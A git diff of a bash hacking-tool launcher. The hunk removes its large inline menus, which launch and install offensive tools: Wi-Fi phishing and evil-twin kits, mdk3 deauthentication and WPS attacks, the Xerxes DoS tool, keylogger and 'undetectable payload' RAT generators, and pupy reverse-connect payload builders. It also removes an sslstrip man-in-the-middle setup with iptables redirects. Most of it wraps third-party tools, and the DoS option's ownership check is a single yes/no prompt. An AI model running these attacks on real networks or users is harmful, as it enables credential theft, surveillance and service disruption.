-					echo -e ""$RS"13"$CE") "$RS"KickThemOut"$CE"        Kick clients out of your network"
-				fi
-				if [ -d /root/ghost-phisher ]
-				then	
-					echo -e ""$YS"14"$CE") Ghost-Phisher      Fake AP,MITM,Session hijacking etc..."
-				else
-					echo -e ""$RS"14"$CE") "$RS"Ghost-Phisher"$CE"      Fake AP,MITM,Session hijacking etc..."
-				fi
-				if [ -d /root/The-Eye ]
-				then	
-					echo -e ""$YS"15"$CE") The Eye            Detects ARP poisoning DNS spoofing etc..."
-				else
-					echo -e ""$RS"15"$CE") "$RS"The Eye"$CE"            Detects ARP poisoning DNS spoofing etc..."
-				fi
-				if [ -d /root/xerxes ]
-				then	
-					echo -e ""$YS"16"$CE") Xerxes             The most powerful DoS tool(CAUTION)"
-				else
-					echo -e ""$RS"16"$CE") "$RS"Xerxes"$CE"             The most powerful DoS tool(CAUTION)"
-				fi
-				#~ echo -e ""$YS"16"$CE") ShARP(problematic) Detects who is spoofing on your network"
-				if [ -d /root/mdk3-master ]
-				then
-					echo -e ""$YS"17"$CE") Mdk3-master        Tries to lock / reboot AP and more..."
-				else
-					echo -e ""$RS"17"$CE") "$RS"Mdk3-master"$CE"        Tries to lock / reboot AP and more..."
-				fi
-				if [ -d /root/mdk3-master ]
-				then
-					echo -e ""$YS"18"$CE") Mdk3-master        Tries to reboot the AP and unlock the WPS lock"
-				else
-					echo -e ""$RS"18"$CE") "$RS"Mdk3-master"$CE"        Tries to reboot the AP and unlock the WPS lock"
-				fi
-				if [ -d /root/KatanaFramework ]
-				then
-					echo -e ""$YS"19"$CE") Katana Framework   Many penetration testing features"
-				else
-					echo -e ""$RS"19"$CE") "$RS"Katana Framework"$CE"   Many penetration testing features"
-				fi
-				if [ -d /root/airgeddon ]
-				then
-					echo -e ""$YS"20"$CE") Airgeddon          Evil twin-WPA WPA2-WEP-WPS and more"
-				else
-					echo -e ""$RS"20"$CE") "$RS"Airgeddon"$CE"          Evil twin-WPA WPA2-WEP-WPS and more"
-				fi
-				if [ -f /usr/bin/websploit ]
-				then
-					echo -e ""$YS"21"$CE") Websploit          Wireless attack-multitool"
-				else
-					echo -e ""$RS"21"$CE") "$RS"Websploit"$CE"          Wireless attack-multitool"
-				fi
-				if [ -d /etc/openvas ]
-				then
-					echo -e ""$YS"22"$CE") Openvas            Vulnerability scanner LAN"
-				else
-					echo -e ""$RS"22"$CE") "$RS"Openvas"$CE"            Vulnerability scanner LAN"
-				fi
-				echo -e ""$YS"back"$CE") Go back"
-				echo -e ""$YS"00"$CE") Main menu"
-				#echo -e ""$YS" 0"$CE") EXIT"
-				echo -e "Choose: "
-				read -e APPP
-				clear
-				if [ "$APPP" = "1" ]
-				then
-					cd /root/fluxion
-					./fluxion
-					cd
-				elif [ "$APPP" = "2" ]
-				then
-					wifite
-				elif [ "$APPP" = "3" ]
-				then
-					echo -e "Do you have 1 or 2 wireless interfaces?: "
-					read ONEORTWO
-					if [ "$ONEORTWO" = "1" ]
-					then
-						clear
-						echo -e "Note that with only 1 wireless interface, wifiphisher doesn't deauthenticate the AP."
-						sleep 1
-						echo -e ""
-						echo -e "$PAKTC"
-						$READAK
-						clear
-						wifiphisher -nJ
-					else
-						clear
-						wifiphisher
-					fi
-				elif [ "$APPP" = "d3" ]
-				then
-					echo -e "Enter the name of the access point you want to create: "
-					read -e ESSIDAP
-					wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login
-				elif [ "$APPP" = "4" ]
-				then
-					if [ -d "/root/Zatacker" ]
-					then	
-						cd /root/Zatacker
-						./ZT.sh
-						cd
-					else
-						echo -e "You have to install it manually since its not on github.Sorry."
-						sleep 4
-						exec bash "$0"
-					fi
-				elif [ "$APPP" = "5" ]
-				then
-					cd /root/morpheus
-					./morpheus.sh
-					cd
-				elif [ "$APPP" = "7" ] 
-				then
-					echo -e "type: 'show modules' to start"
-					sleep 2
-					clear
-					cd /root/hakkuframework
-					./hakku
-					cd
-				elif [ "$APPP" = "8" ]
-				then
-					echo -e "type: 'help' to start"
-					sleep 2
-					clear
-					trity			
-				elif [ "$APPP" = "9" ]
-				then
-					cd /root/cupp
-					python cupp.py -i
-					cd			
-				elif [ "$APPP" = "10" ]
-				then
-					cd /root/Dracnmap/
-					./dracnmap-v*.sh	
-					cd		
-				elif [ "$APPP" = "11" ]
-				then
-					cd /root/Fern-Wifi-Cracker
-					python execute.py
-					cd
-				elif [ "$APPP" = "12" ]
-				then
-					netdiscover
-				elif [ "$APPP" = "13" ]
-				then
-					cd /root/kickthemout
-					python kickthemout.py
-					cd
-				elif [ "$APPP" = "14" ]
-				then
-					cd /root/ghost-phisher/Ghost-Phisher
-					python ghost.py
-					cd
-				elif [ "$APPP" = "15" ]
-				then
-					cd /root/The-Eye
-					./TheEye
-					cd
-				elif [ "$APPP" = "16" ]
-				then
-					echo -e "Do you own the site you want to DoS?"$YNONLY""
-					read DOSTERM
-					if [ "$DOSTERM" = "y" ]
-					then
-
-						clear
-						echo -e "Enter your site(etc iownthissite.com): "
-						echo -e "(without www)"
-						read -e SITEDOS
-						clear
-						echo -e "Launching www.isitdownrightnow.com for $SITEDOS"
-						sleep 4
-						xdg-open http://www.isitdownrightnow.com/"$SITEDOS".html
-						clear	
-						cd /root/xerxes
-						SITEDOSX=www.$SITEDOS
-						echo -e "Press "$YS"any key"$CE" to start DoS on $SITEDOSX"
-						$READAK
-						./xerxes $SITEDOSX 80
-					else
-						clear
-						echo -e "Then never try this."
-						sleep 3
-						exec bash "$0"
-					fi
-				elif [ "$APPP" = "17" ]
-				then
-					echo -e "Press "$YS"CTRL C"$CE" when you find your target AP"
-					echo -e "Press "$YS"any key"$CE" to start scanning."
-					$READAK
-					airodump-ng $WLANNM
-					echo -e "Enter your target's BSSID: "
-					read -e MDBSSID
-					echo -e "Enter your target's channel: "
-					read -e MDCHANN
-					echo -e "Enter frames per second(etc 50): "
-					read -e FPS
-					clear
-					xterm -e 'mdk3 $WLANNM t $MDCHANN $MDBSSID $FPS'		
-				elif [ "$APPP" = "18" ]
-				then	
-					echo -e "Press "$YS"any key"$CE" to start scanning with wash."
-					$READAK
-					gnome-terminal -e 'wash -i $WLANNM'
-					echo -e "Enter your target's BSSID: "
-					read -e MDBSSID
-					echo -e "Enter your target's ESSID: "
-					read -e MDESSID
-					#~ echo -e "Enter your target's channel: "
-					#~ read -e MDCHANN
-					echo -e "Enter frames per second(etc 50): "
-					read -e FPS
-					clear
-					xterm -e 'mdk3 $WLANNM x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
-				elif [ "$APPP" = "19" ]
-				then
-					ktf.console
-				elif [ "$APPP" = "20" ]
-				then
-					cd /root/airgeddon
-					./airgeddon.sh
-					cd
-				elif [ "$APPP" = "21" ]
-				then
-					websploit
-				elif [ "$APPP" = "22" ]
-				then
-					echo -e "Start or stop?("$YS"start"$CE"/"$YS"stop"$CE")"
-					read -e SORS
-					if [ "$SORS" == "start" ]
-					then
-						netstat -nltp
-						openvas-start
-						echo -e "Launching firefox..."
-						sleep 1
-						firefox https://127.0.0.1:9392
-					else
-						openvas-stop
-					fi
-				elif [ "$APPP" = "6" ]
-				then
-					while true
-					do
-					printf '\033]2;OSRFCONSOLE\a'
-					clear
-					echo -e ""$YS" 1"$CE") usufy"
-					echo -e ""$YS" 2"$CE") mailfy"
-					echo -e ""$YS" 3"$CE") searchfy"
-					echo -e ""$YS" 4"$CE") domainfy"
-					echo -e ""$YS" 5"$CE") phonefy"
-					echo -e ""$YS" 6"$CE") entify"
-					echo -e ""$YS"back"$CE") Go back"
-					echo -e ""$YS"00"$CE") Main menu"
-				#	echo -e ""$YS" 0"$CE") EXIT"
-					echo -e "Choose: "
-					read -e OSFR
-					clear
-						if [ "$OSFR" = "1" ]
-						then
-							echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
-							usufy.py
-							exit
-						elif [ "$OSFR" = "2" ]
-						then
-							echo -e "Use: mailfy.py -n name1"
-							mailfy.py
-							exit
-						elif [ "$OSFR" = "3" ]
-						then
-							searchfy.py
-							exit
-						elif [ "$OSFR" = "4" ]
-						then
-							domainfy.py
-							exit
-						elif [ "$OSFR" = "5" ]
-						then
-							phonefy.py
-							exit
-						elif [ "$OSFR" = "6" ]
-						then
-					 	entify.py
-							exit
-						elif [ "$OSFR" = "0" ]
-						then
-							exit
-						elif [ "$OSFR" = "00" ]
-						then
-							exec bash "$0"
-						elif [ "$OSFR" = "back" ]
-						then
-							break
-						else 
-							echo -e "Wrong choice"
-							sleep 0.3
-							clear
-							exec bash "$0"
-						fi
-					done
-				elif [ "$APPP" = "0" ]
-				then
-					clear
-					exit
-				elif [ "$APPP" = "00" ]
-				then
-					clear
-					exec bash "$0"
-				elif [ "$APPP" = "back" ]
-				then
-					break
-				fi
-				done
+				wifi_tools
 			elif [ "$CATEG" = "2" ]
 			then
-				while true 
-				do
-				clear
-				echo -e "-------------------------"$RS"Remote access"$CE"---------------------------"
-				printf '\033]2;REMOTE ACCESS\a'
-				if [ -d /root/BeeLogger ]
-				then
-					echo -e ""$YS" 1"$CE") BeeLogger    Generate keylogger"
-				else
-					echo -e ""$RS" 1"$CE") "$RS"BeeLogger"$CE"    Generate keylogger"
-				fi
-				if [ -d /root/ezsploit ]
-				then
-					echo -e ""$YS" 2"$CE") Ezsploit     Generate payloads for many platforms,listeners etc..."
-				else
-					echo -e ""$RS" 2"$CE") "$RS"Ezsploit"$CE"     Generate payloads for many platforms,listeners etc..."
-				fi
-				if [ -d /root/pupy ]
-				then
-					echo -e ""$YS" 3"$CE") Pupy         Generate payloads for many platforms,listeners etc..."
-				else
-					echo -e ""$RS" 3"$CE") "$RS"Pupy"$CE"         Generate payloads for many platforms,listeners etc..."
-				fi
-				if [ -d /root/zirikatu ]
-				then
-					echo -e ""$YS" 4"$CE") Zirikatu     Generate undetectable payloads"
-				else
-					echo -e ""$RS" 4"$CE") "$RS"Zirikatu"$CE"     Generate undetectable payloads"
-				fi
-				if [ -d /root/TheFatRat ]
-				then
-					echo -e ""$YS" 5"$CE") TheFatRat     Generate undetectable payloads"
-				else
-					echo -e ""$RS" 5"$CE") "$RS"TheFatRat"$CE"     Generate undetectable payloads"
-				fi
-				echo -e ""$YS"back"$CE") Go back"
-				echo -e ""$YS"00"$CE") Main menu"
-				#echo -e ""$YS" 0"$CE") EXIT"
-				echo -e "Choose: "
-				read -e KEYLOG
-				clear
-				if [ "$KEYLOG" = "1" ]
-				then
-					cd /root/BeeLogger
-					python bee.py
-					cd
-				elif [ "$KEYLOG" = "2" ]
-				then
-					clear
-					cd /root/ezsploit/
-					./ezsploit.sh
-					cd
-					#~ echo -e "TUTORIAL AFTER GENERATION OF PAYLOAD"
-					#~ echo -e "Open a new terminal and type:"
-					#~ echo -e "msfconsole"
-					#~ echo -e "use exploit/multi/handler"
-					#~ echo -e "THIS DEPENDS ON THE PLAYLOAD TYPE. ETC FOR ANDROID IS: set payload android/meterpreter/reverse_tcp"
-					#~ echo -e "set lhost <YOUR IP HERE>"
-					#~ echo -e "set lport 4444"
-					#~ echo -e "exploit"
-					echo -e "Go to metasploit menu to create a listener(Option "$YS"14"$CE")"
-					sleep 2
-					echo -e "Press "$YS"any key"$CE" to leave..."
-					$READAK
-					exec bash "$0"
-				elif [ "$KEYLOG" = "3" ]
-				then
-					while true
-					do
-					clear
-					echo -e"MORE FEATURES AND METASPLOIT AUTOMATION WILL BE ADDED SOON"
-					echo -e ""$YS" 1"$CE") Generate a payload"
-					echo -e ""$YS" 2"$CE") Start listener"
-					echo -e ""$YS"back"$CE") Go back"
-					echo -e ""$YS"00"$CE") Main menu"
-					echo -e ""$YS" 0"$CE") EXIT"
-					read -e PUPY
-					if [ "$PUPY" = "1" ]
-					then
-						clear
-						echo -e "Choose the target OS:"
-						echo -e ""$YS" 1"$CE") Windows"
-						echo -e ""$YS" 2"$CE") Linux"
-						echo -e ""$YS" 3"$CE") Android"
-						echo -e "Choose: "
-						read -e TAROS
-						if [ "$TAROS" = "1" ]
-						then
-							TAROS="windows"
-						elif [ "$TAROS" = "2" ]
-						then
-							TAROS="linux"
-						elif [ "$TAROS" = "3" ]
-						then
-							TAROS="android"
-						else
-							echo -e "Wrong choice.Returning to main manu..."
-							sleep 2
-							exec bash "$0"
-						fi
-						clear
-						echo -e "Enter your ip: "
-						read -e PUPYIP
-						clear
-						echo -e "Enter your port(etc: 443): "
-						read -e PUPYPORT
-						clear
-						echo -e "Enter the full output path(etc: /root/Desktop/payload1.exe)"
-						read -e PUPYPATH
-						cd /root/pupy/pupy
-						./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
-					elif [ "$PUPY" = "2" ]
-					then
-						cd /root/pupy/pupy
-						./pupysh.py
-					elif [ "$PUPY" = "00" ]
-					then
-						exec bash "$0"
-					elif [ "$PUPY" = "back" ]
-					then
-						break
-					elif [ "$PUPY" = "0" ]
-					then
-						exit
-					fi
-					done
-				elif [ "$KEYLOG" = "4" ]
-				then
-					clear
-					echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
-					sleep 3
-					echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
-					read MUSTBEYES
-					if [ "$MUSTBEYES" = "YES" ] 
-					then 
-						clear
-						cd /root/zirikatu
-						./zirikatu.sh
-					fi
-				elif [ "$KEYLOG" = "5" ]
-				then
-					clear
-					fatrat
-				elif [ "$KEYLOG" = "00" ]
-				then
-					clear
-					exec bash "$0"
-				elif [ "$KEYLOG" = "0" ]
-				then
-					clear
-					exit
-				elif [ "$KEYLOG" = "back" ]
-				then
-					break
-				fi
-				done
+				remote_access
 			elif [ "$CATEG" = "3" ]
 			then
-				while true
-				do
-				clear
-				echo -e "Select a tool to install/reinstall"
-				echo -e " "$YS"1"$CE") Fluxion"
-				echo -e ""$YS" 2"$CE") Wifite"
-				echo -e ""$YS" 3"$CE") Wifiphisher "
-				echo -e ""$YS" 4"$CE") Zatacker"
-				echo -e ""$YS" 5"$CE") Morpheus"
-				echo -e ""$YS" 6"$CE") Osrfconsole"
-				echo -e ""$YS" 7"$CE") Hakku"
-				echo -e ""$YS" 8"$CE") Trity"
-				echo -e ""$YS" 9"$CE") Cupp"
-				echo -e ""$YS"10"$CE") Dracnmap"
-				echo -e ""$YS"11"$CE") Fern"
-				echo -e ""$YS"12"$CE") Netdiscover"
-				echo -e ""$YS"13"$CE") KickThemOut"
-				echo -e ""$YS"14"$CE") Ghost-Phisher"
-				echo -e ""$YS"15"$CE") The Eye"
-				echo -e ""$YS"16"$CE") Xerxes"
-				echo -e ""$YS"17"$CE") Mdk3-master"
-				echo -e ""$YS"18"$CE") Katana Framework"
-				echo -e ""$YS"19"$CE") Airgeddon"				
-				echo -e ""$YS"20"$CE") Websploit"
-				echo -e ""$YS"21"$CE") 4nonimizer"
-				echo -e ""$YS"22"$CE") Openvas"
-				echo -e ""$YS"23"$CE") BeeLogger"
-				echo -e ""$YS"24"$CE") Ezsploit"
-				echo -e ""$YS"25"$CE") Pupy"
-				echo -e ""$YS"26"$CE") Zirikatu"
-				echo -e ""$YS"27"$CE") WiFi-autopwner"
-				echo -e ""$YS"28"$CE") Bully"
-				echo -e ""$YS"29"$CE") Anonsurf"
-				echo -e ""$YS"30"$CE") Anonym8"
-				echo -e ""$YS"31"$CE") TheFatRat"
-				echo -e ""$YS"back"$CE") Go back"
-				echo -e ""$YS" 0"$CE") Exit"
-				echo -e "Choose: "
-				read REIN
-				clear
-				if [ "$REIN" = "1" ]
-				then
-					if [ -d "/root/fluxion" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/fluxion
-					fi
-		echo -e "Installing fluxion"
-		echo -e "Tool by Deltaxflux"
-		sleep 1
-		cd
-		wget https://fluxion.tk/fluxion-unstable.zip
-		apt-get install unzip
-		clear
-		unzip /root/fluxion*.zip -d /root
-		cd /root/fluxion/install
-		chmod +x install.sh
-		./install.sh					
-				elif [ "$REIN" = "2" ]
-				then
-		apt-get install wifite
-				elif [ "$REIN" = "3" ]
-				then
-					if [ -d "/root/wifiphisher" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/wifiphisher
-					fi
-		echo -e "Installing Wifiphisher"
-		echo -e "Tool idea by Dan McInerney"
-		sleep 1
-		git clone https://github.com/wifiphisher/wifiphisher.git
-		cd wifiphisher
-		sudo python setup.py install
-		sleep 1
-				elif [ "$REIN" = "4" ]
-				then
-		echo -e "I cannot install Zatacker. Please google how to do that yourself."
-		echo -e "PAKTGB"
-		read
-				elif [ "$REIN" = "5" ]
-				then
-					if [ -d "/root/morpheus" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/morpheus
-					fi				
-		echo -e "Installing Morpheus"
-		echo -e "Tool by Pedro ubuntu  [ r00t-3xp10it ]"
-		sleep 1
-		cd
-		git clone https://github.com/r00t-3xp10it/morpheus.git
-		cd morpheus
-		chmod +x morpheus.sh
-				elif [ "$REIN" = "6" ]
-				then
-	pip install osrframework			
-				elif [ "$REIN" = "7" ]
-				then
-					if [ -d "/root/hakkuframework" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/hakkuframework
-					fi		
-		echo -e "Installing Hakku"
-		echo -e "Tool by 4shadoww"
-		sleep 1
-		cd
-		git clone https://github.com/4shadoww/hakkuframework.git
-		cd hakkuframework
-		chmod +x hakku
-		chmod +x install							
-				elif [ "$REIN" = "8" ]
-				then
-					if [ -d "/root/Trity" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/Trity
-					fi		
-		echo -e "Installing Trity"
-		echo -e "Tool by Toxic-ig"
-		sleep 1
-		git clone https://github.com/toxic-ig/Trity.git
-		cd Trity
-		sudo python install.py							
-				elif [ "$REIN" = "9" ]
-				then
-					if [ -d "/root/cupp" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/cupp
-					fi			
-		echo -e "Installing Cupp"
-		echo -e "Tool by Muris Kurgas"
-		sleep 1
-		cd
-		git clone https://github.com/Mebus/cupp.git
-		cd cupp
-		chmod +x cupp.py	
-				elif [ "$REIN" = "10" ]
-				then
-					if [ -d "/root/Dracnmap" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/Dracnmap
-					fi			
-		echo -e "Installing Dracnmap"
-		echo -e "Tool by Edo -maland-"
-		cd
-		git clone https://github.com/Screetsec/Dracnmap.git
-		cd Dracnmap
-		chmod +x Dracnmap.sh	
-				elif [ "$REIN" = "11" ]
-				then
-					if [ -d "/root/Fern-Wifi-Cracker" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/Fern-Wifi-Cracker
-					fi		
-		echo -e "Installing Fern"
-		echo -e "Tool by Savio-code"
-		sleep 1
-		cd 
-		svn checkout http://github.com/savio-code/fern-wifi-cracker/trunk/Fern-Wifi-Cracker/
-		cd Fern-Wifi-Cracker
-		chmod +x execute.py		
-				elif [ "$REIN" = "12" ]
-				then
-		apt-get install netdiscover			
-				elif [ "$REIN" = "13" ]
-				then
-					if [ -d "/root/kickthemout" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/kickthemout
-					fi		
-		echo -e "Installing Kichthemout"
-		echo -e "Tool by Nikolaos Kamarinakis & David Schütz"
-		sleep 2
-		apt-get install nmap
-		git clone https://github.com/k4m4/kickthemout.git
-		cd kickthemout/
-		sudo python -m pip install -r requirements.txt
-				elif [ "$REIN" = "14" ]
-				then
-					if [ -d "/root/ghost-phisher" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/ghost-phisher
-					fi			
-		echo -e "Installing Ghost-Phisher"
-		echo -e "Tool by Savio-code"
-		sleep 1
-		cd
-		git clone https://github.com/savio-code/ghost-phisher.git
-		sleep 1
-		chmod +x /root/ghost-phisher/Ghost-Phisher/ghost.py
-				elif [ "$REIN" = "15" ]
-				then
-					if [ -d "/root/The-Eye" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/The-Eye
-					fi			
-		echo -e "Installing The Eye"
-		echo -e "Tool by EgeBalci"
-		sleep 1
-		cd
-		git clone https://github.com/EgeBalci/The-Eye.git
-		cd The-Eye
-		chmod +x TheEye	
-				elif [ "$REIN" = "16" ]
-				then
-					if [ -d "/root/xerxes" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/xerxes
-					fi			
-		echo -e "Installing Xerxes"
-		echo -e "Tool by zanyarjamal"
-		cd
-		git clone https://github.com/zanyarjamal/xerxes
-		cd xerxes
-		gcc xerxes.c -o xerxes	
-				elif [ "$REIN" = "17" ]
-				then
-					if [ -d "/root/mdk3-master" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/mdk3-master
-					fi				
-		echo -e "Installing Mdk3-master"
-		echo -e "Tool by Musket Developer"
-		cd
-		git clone https://github.com/wi-fi-analyzer/mdk3-master.git
-		cd /root/mdk3-master
-		make
-		make install
-				elif [ "$REIN" = "18" ]
-				then
-					if [ -d "/root/KatanaFramework" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/KatanaFramework
-					fi				
-					echo -e "Installing Katana framework"
-					echo -e "Tool by PowerScript"
-					cd
-					git clone https://github.com/PowerScript/KatanaFramework.git
-					cd KatanaFramework
-					sh dependencies
-					python install					
-				elif [ "$REIN" = "19" ]
-				then
-					if [ -d "/root/airgeddon" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/airgeddon
-					fi
-						echo -e "Installing..."
-						sleep 1
-						echo -e "Installing Airgeddon"
-						echo -e "Tool by v1s1t0r1sh3r3"
-						cd
-						git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
-						cd airgeddon
-						chmod +x airgeddon.sh
-				elif [ "$REIN" = "20" ]
-				then
-	apt-get install websploit			
-				elif [ "$REIN" = "21" ]
-				then
-					if [ -d "/root/4nonimizer" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/4nonimizer
-					fi		
-		echo -e "Installing 4nonimizer"
-		echo -e "Tool by Hackplayers"
-		cd
-		git clone https://github.com/Hackplayers/4nonimizer.git
-		cd 4nonimizer
-		chmod +x 4nonimizer
-		./4nonimizer install
-		clear
-		cd
-		apt-get install python-pip
-		apt-get install php-curl
-		gem install pcaprub
-		gem install packetfu	
-				elif [ "$REIN" = "22" ]
-				then
-		apt-get install openvas
-		openvas-setup
-				elif [ "$REIN" = "23" ]
-				then
-					if [ -d "/root/BeeLogger" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/BeeLogger
-					fi	
-		echo -e "Installing BeeLogger"
-		echo -e "Tool by Alisson Moretto - 4w4k3"
-		cd
-		git clone https://github.com/4w4k3/BeeLogger.git
-		cd BeeLogger
-		chmod +x install.sh
-		./install.sh
-		cd
-		apt-get install python-pip
-		apt-get install php-curl
-		gem install pcaprub
-		gem install packetfu
-		clear
-				elif [ "$REIN" = "24" ]
-				then
-					if [ -d "/root/ezsploit" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/ezsploit
-					fi				
-		echo -e "Installing Ezsploit"
-		echo -e "Tool by rand0m1ze"
-		git clone https://github.com/rand0m1ze/ezsploit.git
-		cd ezsploit/
-		chmod +x ezsploit.sh
-				elif [ "$REIN" = "25" ]
-				then
-					if [ -d "/root/pupy" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/pupy
-					fi			
-		echo -e "Installing Pupy"
-		echo -e "Tool by n1nj4sec"
-		cd
-		git clone https://github.com/n1nj4sec/pupy.git
-		cd pupy
-		git submodule init
-		git submodule update
-		pip install -r pupy/requirements.txt
-				elif [ "$REIN" = "26" ]
-				then
-					if [ -d "/root/zirikatu" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/zirikatu
-					fi		
-		echo -e "Installing Zirikatu"
-		echo -e "Tool by pasahitz"
-		cd
-		git clone https://github.com/pasahitz/zirikatu.git
-		cd zirikatu
-		chmod +x zirikatu.sh
-				elif [ "$REIN" = "27" ]
-				then
-					if [ -d "/root/WiFi-autopwner" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/WiFi-autopwner
-					fi		
-		echo -e "Installing WiFi-autopwner"
-		echo -e "Tool by Mi-Al"
-		cd
-		git clone https://github.com/Mi-Al/WiFi-autopwner.git
-				elif [ "$REIN" = "28" ]
-				then
-					if [ -d "/root/bully" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/bully
-					fi				
-		echo -e "Installing Bully"
-		echo -e "Tool by Aanarchyy"
-		cd
-		git clone https://github.com/aanarchyy/bully.git
-		cd bully
-		cd src
-		make
-		sudo make install		
-				elif [ "$REIN" = "29" ]
-				then
-					if [ -d "/root/kali-anonsurf" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/kali-anonsurf
-					fi		
-		cd
-		echo -e "Installing Anonsurf"
-		echo -e "Tool by Und3rf10w"
-		git clone https://github.com/Und3rf10w/kali-anonsurf.git
-		cd kali-anonsurf
-		chmod +x installer.sh
-		./installer.sh
-		sleep 1
-				elif [ "$REIN" = "30" ]
-				then
-					if [ -d "/root/anonym8" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/anonym8
-					fi		
-		echo -e "Installing Anonym8"
-		echo -e "Tool by HiroshiManRise"
-		git clone https://github.com/HiroshiManRise/anonym8.git
-		cd anonym8
-		chmod +x INSTALL.sh
-		./INSTALL
-		sleep 1	
-				elif [ "$REIN" = "31" ]
-				then	
-					if [ -d "/root/TheFatRat" ]
-					then
-						echo -e "Removing old..."
-						echo -e "$PAKTC"
-						rm -r /root/TheFatRat
-					fi	
-		echo -e "Installing TheFatRat"
-		echo -e "Tool by Screetsec"
-		cd
-		git clone https://github.com/Screetsec/TheFatRat.git
-		cd TheFatRat
-		chmod +x setup.sh && ./setup.sh	
-				elif [ "$REIN" = "back" ]
-				then
-					clear
-					break
-				elif [ "$REIN" = "0" ]
-				then	
-					clear
-					exit
-				fi
-				done
+				reinstall_tools
 			elif [ "$CATEG" = "0" ]
 			then
 				clear
 				exit
 			elif [ "$CATEG" = "back" ]
 			then
+				BACKL="1"
 				break
 			elif [ "$CATEG" = "00" ]
 			then
@@ -1761,559 +2450,18 @@ var1=1
 		fi
 	elif [ "$YORNAA" = "13" ]
 	then
-		clear
-		echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
-		printf '\033]2;MITM\a'
-		echo -e ""$YS" 1"$CE") Password sniff-sslstrip"
-		echo -e ""$YS" 2"$CE") SET + mitm + dnsspoofing"
-		echo -e ""$YS"back"$CE") Go back"
-		echo -e ""$YS" 0"$CE") EXIT"
-		read MITMATT
-		clear
-		if [ "$MITMATT" = "1" ]
-		then
-			while true
-			do
-			clear
-			echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
-			echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward "
-			echo -e ""$YS" 2"$CE") Set iptables"
-			echo -e ""$YS" 3"$CE") Scan and select target IP         "$YS"33"$CE") I have scaned"
-			echo -e ""$YS" 4"$CE") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
-			echo -e ""$YS"back"$CE") Go back"
-			echo -e ""$YS" 0"$CE") EXIT"
-			echo -e "Choose: "
-			read -e MITMCH
-			if [ "$MITMCH" = "1" ]
-			then
-				echo "1" > /proc/sys/net/ipv4/ip_forward
-				echo -e "Done."
-				sleep 1
-			elif [ "$MITMCH" = "d1" ]
-			then
-				echo "0" > /proc/sys/net/ipv4/ip_forward
-				echo -e "Done."
-				sleep 1
-			elif [ "$MITMCH" = "2" ]
-			then
-				clear
-				echo -e "Redirect tcp port 80 to port("$YS"Enter"$CE"=8080):"
-				read PORTTCP
-				if [ "$PORTTCP" = "" ]
-				then
-					PORTTCP="8080"
-				fi
-							clear
-				echo -e "Redirect udp port 40 to port("$YS"Enter"$CE"=40):"
-				read PORTUDP
-				if [ "$PORTUDP" = "" ]
-				then
-					PORTUDP="40"
-				fi
-				iptables --flush
-				iptables --flush -t nat
-				iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
-				iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
-				echo -e "Done."
-				sleep 1
-			elif [ "$MITMCH" = "3" ]
-			then
-				clear
-				route -n
-				echo -e ""
-				echo -e ""
-				echo -e "Enter your gateway(prefer eth0 gateway):"
-				read GATENM
-				echo -e ""
-				echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
-				read GATEINT
-				if [ "$GATEINT" = "" ]
-				then
-					GATEINT="eth0"
-				fi	
-				while true
-				do	
-				clear
-				nmap -sP "$GATENM"/24
-				echo -e ""
-				echo -e ""
-				echo -e "Enter your target IP:"
-				read TARGIP
-				if [ "$TARGIP" = "r" ]
-				then
-					continue
-				else
-					break
-				fi
-				done
-				echo -e ""
-				echo -e "$PAKTC"
-				$READAK
-				export GATENM
-				export GATEINT
-				export TARGIP
-				export PORTTCP
-				export PORTUDP
-				cd "$LPATH"/ls
-				gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
-				gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
-				gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
